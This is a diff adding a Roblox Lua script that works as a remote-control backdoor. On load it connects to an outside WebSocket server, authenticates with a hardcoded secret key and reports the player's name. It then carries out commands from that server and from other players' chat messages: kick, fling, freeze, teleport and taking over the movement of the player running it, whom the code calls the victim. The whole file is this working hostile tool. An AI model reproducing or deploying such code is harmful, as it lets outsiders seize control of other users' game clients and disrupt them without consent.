@@ -1,0 +1,333 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local WS_URL = "wss://kiben-script-server.onrender.com"
+local CHAVE_SECRETA = "BatataFritaComQueijo123"
+
+local websocket = nil
+local controlConnection = nil
+local spinConnection = nil
+local invertConnection = nil
+local avisoGui = nil
+local usuarioControlador = nil
+
+local function executarFling()
+    local char = LocalPlayer.Character
+    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+    if rootPart then
+        local bav = Instance.new("BodyAngularVelocity")
+        bav.AngularVelocity = Vector3.new(99999, 99999, 99999)
+        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+        bav.Parent = rootPart
+        
+        local bv = Instance.new("BodyVelocity")
+        bv.Velocity = Vector3.new(0, 500, 0)
+        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        bv.Parent = rootPart
+        
+        task.spawn(function()
+            task.wait(0.5)
+            bav:Destroy()
+            bv:Destroy()
+        end)
+    end
+end
+
+local function executarFreeze()
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.Parent.HumanoidRootPart.Anchored = true
+    end
+end
+
+local function executarUnfreeze()
+    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 16
+        humanoid.JumpPower = 50
+        humanoid.Parent.HumanoidRootPart.Anchored = false
+    end
+end
+
+local function executarKick()
+    LocalPlayer:Kick("Você foi desconectado pelo KiBen.")
+end
+
+local function executarBring(payload, remetente)
+    local char = LocalPlayer.Character
+    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+    if rootPart then
+        if type(payload) == "table" then
+            rootPart.CFrame = CFrame.new(Vector3.new(payload[1], payload[2], payload[3]))
+        else
+            local adminPlayer = Players:FindFirstChild(remetente)
+            if adminPlayer and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                rootPart.CFrame = adminPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 3)
+            end
+        end
+    end
+end
+
+local function mostrarAvisoVitima(nomeAdmin)
+    if avisoGui then avisoGui:Destroy() end
+    avisoGui = Instance.new("ScreenGui")
+    avisoGui.Name = "KiBenControlWarning"
+    avisoGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    
+    local txt = Instance.new("TextLabel")
+    txt.Size = UDim2.new(1, 0, 0, 50)
+    txt.Position = UDim2.new(0, 0, 0.05, 0)
+    txt.BackgroundTransparency = 0.4
+    txt.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+    txt.TextColor3 = Color3.fromRGB(255, 255, 255)
+    txt.TextSize = 20
+    txt.Font = Enum.Font.SourceSansBold
+    txt.Text = "OOPS! " ..nomeAdmin.. " ESTÁ TE CONTROLANDO!"
+    txt.Parent = avisoGui
+end
+
+local function removerAvisoVitima()
+    if avisoGui then
+        avisoGui:Destroy()
+        avisoGui = nil
+    end
+end
+
+local function ligarControl(nomeAdmin)
+    if controlConnection then 
+        controlConnection:Disconnect() 
+        controlConnection = nil
+    end
+    
+    usuarioControlador = nomeAdmin
+    mostrarAvisoVitima(nomeAdmin)
+    
+    controlConnection = RunService.RenderStepped:Connect(function(dt)
+        local success, err = pcall(function()
+            local adminPlayer = Players:FindFirstChild(usuarioControlador)
+            if adminPlayer and adminPlayer.Character then
+                local adminRoot = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
+                local adminHumanoid = adminPlayer.Character:FindFirstChildOfClass("Humanoid")
+                
+                local char = LocalPlayer.Character
+                local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+                
+                if adminRoot and rootPart and humanoid and adminHumanoid then
+                    -- Interpola suavemente a posição e a rotação igualzinho da última vez que funcionou
+                    rootPart.CFrame = rootPart.CFrame:Lerp(adminRoot.CFrame, math.clamp(dt * 20, 0, 1))
+                    
+                    -- Repassa o movimento e o pulo
+                    humanoid:Move(adminHumanoid.MoveDirection, false)
+                    humanoid.Jump = adminHumanoid.Jump
+                end
+            end
+        end)
+    end)
+end
+
+local function desligarControl()
+    if controlConnection then
+        controlConnection:Disconnect()
+        controlConnection = nil
+    end
+    usuarioControlador = nil
+    removerAvisoVitima()
+end
+
+local function ligarSpinbot()
+    if spinConnection then spinConnection:Disconnect() end
+    spinConnection = RunService.RenderStepped:Connect(function()
+        pcall(function()
+            local char = LocalPlayer.Character
+            local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+            if rootPart then
+                rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(10), 0)
+            end
+        end)
+    end)
+end
+
+local function desligarSpinbot()
+    if spinConnection then
+        spinConnection:Disconnect()
+        spinConnection = nil
+    end
+end
+
+local function ligarInverterControles(nomeAdmin)
+    if invertConnection then invertConnection:Disconnect() end
+    
+    invertConnection = RunService.RenderStepped:Connect(function()
+        pcall(function()
+            local adminPlayer = Players:FindFirstChild(nomeAdmin) or Players:FindFirstChild("KiBenBlox")
+            if adminPlayer and adminPlayer.Character then
+                local adminHumanoid = adminPlayer.Character:FindFirstChildOfClass("Humanoid")
+                
+                local char = LocalPlayer.Character
+                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+                local rootPart = char and char:FindFirstChild("HumanoidRootPart")
+                
+                if humanoid and adminHumanoid and rootPart then
+                    local moveDir = adminHumanoid.MoveDirection
+                    if moveDir.Magnitude > 0 then
+                        -- Converte a direção do mundo para o espaço local da vítima e inverte os eixos X e Z
+                        local localDir = rootPart.CFrame:VectorToObjectSpace(moveDir)
+                        localDir = Vector3.new(-localDir.X, 0, -localDir.Z)
+                        local globalInvertido = rootPart.CFrame:VectorToWorldSpace(localDir)
+                        
+                        humanoid:Move(globalInvertido, true)
+                    end
+                end
+            end
+        end)
+    end)
+end
+
+local function desligarInverterControles()
+    if invertConnection then
+        invertConnection:Disconnect()
+        invertConnection = nil
+    end
+end
+
+-- PROCESSADOR DE COMANDOS POR CHAT (FORMATO CURTO E DIRETO)
+local function processarComandoChat(nomeRemetente, mensagem)
+    local msgLower = string.lower(mensagem)
+    
+    -- Se o comando menciona um alvo específico (ex: :fling nome) ou é global/para si mesmo
+    if string.match(msgLower, "^:control%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:control%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            ligarControl(nomeRemetente)
+        end
+    elseif msgLower == ":uncontrol" then
+        desligarControl()
+    elseif string.match(msgLower, "^:fling%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:fling%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            executarFling()
+        end
+    elseif string.match(msgLower, "^:bring%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:bring%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            executarBring(nomeRemetente)
+        end
+    elseif string.match(msgLower, "^:freeze%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:freeze%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            executarFreeze()
+        end
+    elseif string.match(msgLower, "^:unfreeze%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:unfreeze%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            executarUnfreeze()
+        end
+    elseif string.match(msgLower, "^:kick%s+(%w+)") then
+        local alvo = string.match(msgLower, "^:kick%s+(%w+)")
+        if string.lower(alvo) == string.lower(LocalPlayer.Name) then
+            executarKick()
+        end
+    -- Comandos curtos solicitados (:spin, :unspin, :invert, :uninvert)
+    elseif msgLower == ":spin" then
+        ligarSpinbot()
+    elseif msgLower == ":unspin" then
+        desligarSpinbot()
+    elseif msgLower == ":invert" then
+        ligarInverterControles()
+    elseif msgLower == ":uninvert" then
+        desligarInverterControles()
+    end
+end
+
+-- Escuta chat moderno
+pcall(function()
+    TextChatService.MessageReceived:Connect(function(textChatMessage)
+        if textChatMessage.TextSource then
+            local sender = Players:GetPlayerByUserId(textChatMessage.TextSource.UserId)
+            if sender then
+                processarComandoChat(sender.Name, textChatMessage.Text.Text)
+            end
+        end
+    end)
+end)
+
+-- Escuta chat legado
+pcall(function()
+    LocalPlayer.Chatted:Connect(function(msg)
+        processarComandoChat(LocalPlayer.Name, msg)
+    end)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            p.Chatted:Connect(function(msg)
+                processarComandoChat(p.Name, msg)
+            end)
+        end
+    end
+    Players.PlayerAdded:Connect(function(p)
+        p.Chatted:Connect(function(msg)
+            processarComandoChat(p.Name, msg)
+        end)
+    end)
+end)
+
+local function conectarWebSocket()
+    local success, err = pcall(function()
+        websocket = WebSocket.connect(WS_URL)
+    end)
+
+    if not success then
+        task.wait(5)
+        conectarWebSocket()
+        return
+    end
+
+    websocket:Send(HttpService:JSONEncode({
+        tipo = "auth",
+        chave = CHAVE_SECRETA,
+        jogador = LocalPlayer.Name
+    }))
+
+    websocket.OnMessage:Connect(function(message)
+        local data = HttpService:JSONDecode(message)
+        if not data or not data.comando then return end
+
+        if data.comando == "fling" then
+            executarFling()
+        elseif data.comando == "freeze" then
+            executarFreeze()
+        elseif data.comando == "unfreeze" then
+            executarUnfreeze()
+        elseif data.comando == "kick" then
+            executarKick()
+        elseif data.comando == "bring" then
+            executarBring(data.payload, data.remetente)
+        elseif data.comando == "control_on" then
+            ligarControl(data.payload or data.remetente)
+        elseif data.comando == "control_off" then
+            desligarControl()
+        elseif data.comando == "spin_on" then
+            ligarSpinbot()
+        elseif data.comando == "spin_off" then
+            desligarSpinbot()
+        elseif data.comando == "invert_on" then
+            ligarInverterControles()
+        elseif data.comando == "invert_off" then
+            desligarInverterControles()
+        end
+    end)
+
+    websocket.OnClose:Connect(function()
+        websocket = nil
+        task.wait(5)
+        conectarWebSocket()
+    end)
+end
+
+task.spawn(conectarWebSocket)
+
